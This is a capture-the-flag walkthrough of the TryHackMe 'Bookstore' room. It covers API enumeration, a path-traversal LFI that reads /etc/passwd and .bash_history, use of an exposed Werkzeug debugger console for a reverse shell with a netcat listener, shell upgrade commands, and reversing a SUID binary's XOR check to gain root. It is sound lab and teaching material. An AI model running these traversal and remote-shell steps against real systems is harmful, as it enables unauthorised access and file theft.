## Bookstore THM walkthrough

Bookstore is medium rated room in tryhackme where attacker can test their api hacking skills. It contains some basic api vulnerability by leveraging which attacker had to gain full access to the machine. Let's start.
## Initial recon

The first thing we do is run nmap against the target ip and find out which ports are opened.
`nmap 10.10.247.2 -sC -sV`. The output of the command is shown below.
```
┌──(samsec㉿kali)-[/usr/share/dict]
└─$ nmap 10.10.247.2 -sC -sV    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 18:06 +0545
Nmap scan report for 10.10.247.2 (10.10.247.2)
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Book Store
|_http-server-header: Apache/2.4.29 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-title: Home
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.13 seconds
```

We see 3 ports are opened. Webserver is running on port 80, we have ssh opening and some api running in port 5000. Let's check out the web app first on port 80.

## Web App Enumeration

There's nothing much in the website. We see normal interface and no much endpoints rather than a single login page. We can't signup or create the users also. 
![[website.png]]
![[login.png]]

So, let's head towards enumerating API on port 5000.

## API enumeration

We see the foxy REST API running. What can we do further if we don't have API documentation? Nothing. It's time to do directory bruteforcing or we can check out robots.txt file and find out the disallowed entry for /api.
![[robots.png]]

When viewing the /api endpoints , now we see the documentation for API. We see some endpoints that the API accepts. We view all the available endpoints manually and at the same time we keep our burp running on background so that we can analyze the endpoints further.![[documentation.png]]

When viewing all the endpoints, I didn't find anything interesting. After roaming around the website further, I check the js files. When viewing /api.js file, there is something left over in the comment. ![[comment.png]]

Guess what??. There was LFI vulnerability in the previous version of API ie. v1. Now they updated the version to v2 patching the previous vulnerability.
When you are testing the API, it's always a good practice to look around for Improper Assets Management(changing the version of the api to lower and seeing how the api reacts to the older version). I tried to figure out the changes in older version long time but couldn't move further. I was stuck for a moment. I get lost because  i kept testing the `10.10.247.2:5000/api/v2/resources/books/random4` , trying to find out it accepts any parameters in the older version by which we can find out the LFI issues. This endpoint was safe cause the older version ie. `10.10.247.2:5000/api/v1/resources/books/random4` was removed and replaced with the new one. 
After hanging for a minute, I read the documentation thoroughly and i noticed something. 
![[interesting.png]]

2 or more??? What does that means?? Does this endpoint accepts some other parameters too. To my surprise it did. Running Param Miner on this endpoint reveal `show` parameter. If you append this parameter with value `../../../../../etc/passwd` you get same results as with 2 parameters. But there was vulnerability in previous version right?? So let's check the older version and BOOM!! We get the /etc/passwd of the server. 

![[lfi.png]]

We found the LFI issue in the API. What's next??

## Gaining access to the machine

I tried to read the .ssh/id_rsa if any cause i know there is ssh opened but this  lead to nowhere. When directory bruteforcing the website, I found the endpoint `/console` . And also there is commented line in login.html that says the debugger pin is in the .bash_history file. 
![[debugger.png]]

So, the goal is to get the pin using LFI in the .bash_history file and accessing the /console using that pin. 
![[pin.png]]

Access the console using the pin and run the reverse shell on the console.
You can get the reverse shell payload from `revshells.com` . Set the netcat listener and run the payload and get the reverse shell. 
```
┌──(samsec㉿kali)-[~]
└─$ nc -lnvp 4444            
listening on [any] 4444 ...
connect to [10.17.70.133] from (UNKNOWN) [10.10.247.2] 49434
$ whoami
whoami
sid
$ 

```

You can clean up the tty shell with following lines of command. 
```
SHELL=/bin/bash script -q /dev/null
python3 -c 'import pty; pty.spawn("/bin/bash")'

hit CTRL+Z to run the process in backgroung and run below command
stty raw -echo && fg

the process will run in foreground after this and type reset
and type xterm,
for colorful shell export the term variable. 

export TERM=xterm
You will get fully interactive shell.

```

You can get the user flag easily by doing `cat user.txt`

Now it's time to get the root flag.

## Privilege Escalation

There is binary file having suid bit set called `tryharder`. When running the file, we are prompted to enter the magic number and if that'st correct , we will get the shell, I guess?
```
sid@bookstore:~$ ls
api.py  api-up.sh  books.db  try-harder  user.txt
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
123
Incorrect Try Harder
sid@bookstore:~$
```

Let's do some reversing using Ghidra. Download the binary to the local machine by hosting python server in the machine and wget to download it.
```
┌──(samsec㉿kali)-[~]
└─$ cd /tmp
                                                                                                                                                  
┌──(samsec㉿kali)-[/tmp]
└─$ wget 10.10.247.2:8000/try-harder
--2023-10-11 19:40:36--  http://10.10.247.2:8000/try-harder
Connecting to 10.10.247.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8488 (8.3K) [application/octet-stream]
Saving to: ‘try-harder’

try-harder                           100%[====================================================================>]   8.29K  --.-KB/s    in 0s      

2023-10-11 19:40:37 (176 MB/s) - ‘try-harder’ saved [8488/8488]
```

When decompiling the binary in Ghidra we see the function as:
![[ghidra.png]]

That's it. The goal is to find out the number a where `a ^ 23987 ^4374 = 1573724660` where `^` represents XOR and I've decoded the hex value into decimal. On doing so we get the value of a which is the number we need to input in order to get the shell.
```
┌──(samsec㉿kali)-[/tmp]
└─$ python3 
Python 3.11.5 (main, Aug 29 2023, 15:31:31) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x5db3
23987
>>> 0x1116
4374
>>> 0x5dcd21f4
1573724660
>>> 23987 ^ 4374 ^ 1573724660
1573743953
>>> 

```

We get the shell as root. Now we completed the room. ![[root.png]]

It was little bit overwhelming to get the initial foothold and root was a bit messy for me because i was new to Ghidra when doing this room. Anyway this room teach  me lot more stuffs about about API enumeration and reverse engineering. That much for this blog.
